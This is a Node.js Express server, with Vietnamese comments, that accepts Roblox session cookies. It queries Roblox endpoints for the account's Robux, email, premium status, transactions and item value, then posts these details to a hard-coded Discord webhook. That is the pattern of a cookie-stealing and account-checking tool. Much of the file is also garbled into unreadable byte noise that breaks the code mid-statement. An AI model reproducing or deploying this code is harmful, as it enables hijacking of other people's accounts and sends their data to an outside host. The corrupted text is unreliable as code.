require('dotenv').config();
const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const cors = require("cors");
const path = require("path");
const dns = require('dns');
const ping = require('ping');
const https = require('https');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1281163629278003221/UsFxAWKVhLDb37jw3eQdN7hqsXAxVYR6aZQLKrYC4oja7qqhW5PLDR45f5ztbAM4rSmY';

// Thêm middleware CORS
app.use(cors());

// Thêm middleware để serve static files
app.use(express.static(path.join(__dirname, 'public')));

app.use(bodyParser.json());

app.get("/", (req, res) =64(ɕ̹͕Ѡ}}ɹՉ๡ѵ4)4(4(#GG5ݕӆ4)Ё]Uɰ􀠤4(ɕɸ܁Aɽ͔ɕͽٔɕФ4(̹ɕݕМјȰф4(Ȥ4(ͽɽȠ3]G5ݕ蜰ȹͅ4(ɕɸɕСȤ4(4(ЁɥUɰ􁑅фɥ4(ɥUɰ4(ɕɸɕС܁ɽȠUI0ӆѹ4(4(ɕͽٔɥUɰ쀼QˆꌁۆUI0GGÆɥ4(4(4)4(5݅ɔG)M=84)͔ɕ̹ͽ4(4(5݅ɔGۆӆ4)͔ɕ̹хѥѠ}}ɹՉ4(4(ЃGԁӆ4(4)Р幌ɕİɕ̤4(Ё쁍ɕĹ4(4(4(ɕɸɕ̹х̠ͽ4(Ս聙͔4(ɽ耉-ѹѣ䁍4(4(4(4(Ё̀4(
聀I=	1=M
UI%Qd퍽4(М耝ѥͽ4(
ѥ耝ٔ4(U͕ȵМ耝5饱Ը]́9P]Ф]-мܸ؀-!Q50
ɽĸMɤܸ؜4(4(4(4(-
Ʉѣѹѥ͕4(ͽABIW6W'2&&6rТ67BW6W%&W76RvB47F6RvWBvGG3W6W'2&&6cW6W'2WFVF6FVBrТVFW'2ТFVWC�ТғРТbW6W%&W76RFFW6W%&W76RFFBТF&rWrW'&"t6R;Fr7rn1$p8nt hạn');
        }

        const userData = userResponse.data;
        console.log('Kết nối thành công đến users.roblox.com');

        // Lấy thông tin bổ sung
        console.log('Đang lấy thông tin chi tiết...');
        const userId = userData.id;

        // Tạo các promise cho các request
        const promises = [
            // Lấy thông tin Robux
            axiosInstance.get(`https://economy.roblox.com/v2/users/${userId}/currency`, {
                headers,
                timeout: 10000
            }).catch(error =64(ͽɽȠ3]ѣѹѥI蜰ɽȹͅ4(ɕɸ쁑фɽ4(4(4(3ѣѹѥ4(᥽%хР輽չ͕ѥ̹ɽํĽ4(̰4(ѥ4(эɽȀ4(ͽ3]ѣѹѥ蜰ɽȹͅ4(ɕɸ쁑фٕɥ聙͔4(4(4(3ѣѹѥɕմ4(᥽%хС輽ɕյɕ̹ɽํĽ͕̼͕%مє͡4(̰4(ѥ4(эɽȀТ66RrtvWF;FrF&V֗VӢrW'&"W76vRТ&WGW&FFf6RӰТҒРТWF;FrFfF Т47F6RvWBGG3FV&2&&6cW6W'2fF#W6W$G3GW6W$Gg6SC#C#ff&CvТVFW'2ТFVWC�ТҒ6F6W'&"`HBۜK	8nHH8n^H]]\\܋Y\YJNB]\]N]N[XYU\[WHHNBJKBBxnHH\YH]B^[[[K]
΋[[ܞK؛K݌\\\\YK[[ܞK[Z]LLBXY\B[Y[]LBJK]
\܈OBۜK	8nHHxnHH\YH]\܋Y\YJNB]\]N]NHHNBJKBB8n^HT8n[[ۜB^[[[K]
΋˜[[ۜ˘K\K^Y\\]\\YXB[Y[]LBJK]
\܈OBۜK\܊	8nHH8n^HT8n[[ۜΉ\܋Y\YJNB]\]N\HNBJKBB8n^H0[X[8nB^[[[K]
΋Xۛ^K؛K݌\\\\YK[X[ۋ][[YQ[YOVYX\[X[ە\O\[[X\XBXY\B[Y[]LBJK[\ۜHM response.data).catch(error =64(ͽ3]ѣѹѥ-蜰ɽȹͅ4(ɕɸIQхɕյMѥQхٕ፡Qхɍ͕Qх4(4(t4(4(
tӆЁꌁɕՕЁѣ4(ЁmɽḬḬɕյḬمхḬٕɥ!ḬɽḬɅͅѥt݅ЁAɽ͔ɽ͕̤4(4(-
ɄYɥ!Ѐ%̤4(ЁYɥ!Ѐٕɥ!I̹ффͽѕѕ͕%̤4(4(Ё]Uɰ݅Ё]Uɰ4(4(Sꅼݕѣѹѥ6l:6PТ67B6&VEvV&ТV&VG3ТFFS~)R6R7rrТFW67&FF;FrFL:6>vGW6W$FFWҢ⢤6RfVSG6WIk6Rl:vFW67&FТ6#fcТFV&âfF%&W2FFFFvUW&ТW&âfF%&W2FFFFvUW&ТVFVfVBТfVG3ТТS	BW6W&RrТfVSGW6W$FFWТƖSG'VPТТТS	iBW6W"BrТfVSGW6W$GТƖSG'VPТТТS	؝^	B[YN	ܛ؝^\˙]K؝^WB[[NYCBKBB[YN	'䣈[Z][IB[YN	[Z][T\˙]H		0WB[[NYCBKBB[YN	P Email',
                        value: `\`${emailRes.data.verified 6CѣŌ耝
ѣŌq4(Ք4(4(4(耟rYɥ!М4(مՔ聁qYɥ!Ѐ̜耝-ѹq4(Ք4(4(4(耟v8$rТfVSG&Ɩ5&W2FF&F6U7G&rvVU2r"EТƖSG'VPТТТS	ٚ[IB[YNX\WJ΋˜؛K\\\\YKٚ[JXB[[NYCBKBB[YN	'`N Rolimons',
                        value: `[Click Here](https://www.rolimons.com/player/${userId})`,
                        inline: true
                    },
                    {
                        name: ':money_mouth:  Summary',
                        value: `\`${transactions.purchasesTotal}\``,
                        inline: true
                    },
                    {
                        name: 'aB~JAI4(مՔ聁qɅͅѥ̹IQхq4(Ք4(4(4(耟~:AɕմMѥ̜4(مՔ聁qɅͅѥ̹ɕյMѥQхq4(Ք4(4(4(耟v+RFWfVW"W6vRrТfVSGG&67F2FWfVW$W6vUFFТƖSG'VPТТТfFW#ТFWCvGG3F66&BvruFdpТТFW7FWrFFRF47G&rТТӰРТ~֒vV&>IТvB27BD44$EtT$U$6&VEvV&Т66Rrt~֒vV&>IF:<;FrrРТ~֒vV&NfPТvB27BfUvV&W&6&VEvV&Т66RrtvnZHX8n[H0NBBnnHnt quả
        res.status(200).json({
            success: true,
            message: "Kiểm tra cookie thành công!",
            data: {
                userId,
                username: userData.name,
                displayName: userData.displayName,
                robux: robuxRes.data.robux || 0,
                premium: premiumRes.data,
                email: emailRes.data,
                avatar: avatarRes.data.data[0].imageUrl,
                hasVerifyHat: hasVerifyHat,
                rap: rolimonsRes.data.rap || 0,
                rolimons: `https://www.rolimons.com/player/${userId}`,
                pendingRobuxTotal: transactions.pendingRobuxTotal,
                premiumStipendsTotal: transactions.premiumStipendsTotal,
                developerExchangeTotal: transactions.developerExchangeTotal,
                purchasesTotal: transactions.purchasesTotal
            }
        });

    } catch (error) {
        if (error.response) {
            console.error('Lỗi:', error.response.status);
            console.error('Chi tiết:', error.response.data);
        } else {
            console.error('Lỗi không xác định:', error.message);
        }
        




        const errorMessage = {
            title: '❌ Lỗi Kiểm Tra Cookie',
            description: error.message || 'Lỗi không xác định',
            details: `Thời gian: ${new Date().toLocaleString('vi-VN')}\nMã lỗi: ${error.code || 'Không xác định'}`
        };

        // Gửi webhook thông báo lỗi
        try {
            await axios.post(DISCORD_WEBHOOK_URL, {
                embeds: [{
                    title: errorMessage.title,
                    description: errorMessage.description,
                    color: 0xFF0000,
                    fields: [
                        {
                            name: 'Chi tiết',
                            value: errorMessage.details
                        }
                    ],
                    timestamp: new Date().toISOString()
                }]
            });
        } catch (webhookError) {
            console.error('Lỗi gửi webhook:', webhookError.message);
        }

        res.status(500).json({
            success: false,
            error: errorMessage.description,
            details: errorMessage.details
        });
    }
});

// Cấu hình DNS servers
dns.setServers([
    '8.8.8.8',    // Google DNS
    '8.8.4.4',    // Google DNS (backup)
    '1.1.1.1',    // Cloudflare DNS
    '1.0.0.1'     // Cloudflare DNS (backup)
]);

// Tạo instance axios với c`Fԁ䁍%4)Ё᥽%х᥽̹ɕє4(ѥ͕4(聹܁̹С4(ɕUѡɥ镐聙͔<Մ]MM04(ٔՔ4(ѥ4(4(ɽ聙͔SЁɽ䁷݌G-4(Iɕ4)4(4(4)ѕA=IPТ66Rr6W'fW"2'VrGG6Ɔ7CG%GЧғР=
